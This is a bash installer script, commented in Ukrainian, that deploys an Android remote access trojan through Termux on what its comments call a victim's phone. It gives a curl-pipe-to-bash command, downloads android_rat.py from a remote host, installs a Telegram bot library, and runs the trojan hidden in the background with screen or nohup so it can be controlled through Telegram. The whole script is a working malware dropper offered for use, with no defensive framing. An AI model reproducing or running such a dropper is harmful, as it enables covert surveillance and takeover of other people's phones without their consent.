#!/usr/bin/env bash
#
# install_and_run.sh — автоматично поставить усі залежності, завантажить
# android_rat.py та запустить його в фоновому режимі.
#
# Як використовувати на жертвиному телефоні (Termux):
#   curl -s "https://example.com/install_and_run.sh" | bash
#

# 1) Оновлюємо пакети та встановлюємо python, pip, termux-api, git, wget
echo "[*] Оновлюємо Termux-пакети..."
pkg update -y && pkg upgrade -y

echo "[*] Встановлюємо python, python-pip, termux-api, git, wget..."
pkg install -y python python-pip termux-api git wget

# 2) Створимо теку для RAT
RAT_DIR="$HOME/.android_rat"
if [ ! -d "$RAT_DIR" ]; then
  mkdir -p "$RAT_DIR"
fi

# 3) Закачуємо код android_rat.py
echo "[*] Завантажуємо android_rat.py..."
wget -q -O "$RAT_DIR/android_rat.py" "https://example.com/android_rat.py"

# 4) Встановлюємо python-бібліотеку python-telegram-bot
echo "[*] Встановлюємо python-telegram-bot..."
pip install --quiet --upgrade python-telegram-bot

# 5) Створюємо лог-теку
echo "[*] Створюємо лог-папку..."
mkdir -p "$RAT_DIR/logs"

# 6) Створюємо “screen session” або запускаємо у background
echo "[*] Запускаємо RAT у фоновому режимі..."
cd "$RAT_DIR"
# якщо є screen:
if command -v screen &> /dev/null; then
  # створимо сесію “android_rat_session” (припускаємо, що screen вже встановлений)
  screen -dmS android_rat_session bash -c "python android_rat.py"
else
  # просто запустимо у фоновому режимі
  nohup python android_rat.py > "$RAT_DIR/logs/rat_stdout.log" 2> "$RAT_DIR/logs/rat_stderr.log" &
fi

echo "[✔] RAT встановлено і запущено в тлі. Перевірте бота в Telegram."

exit 0
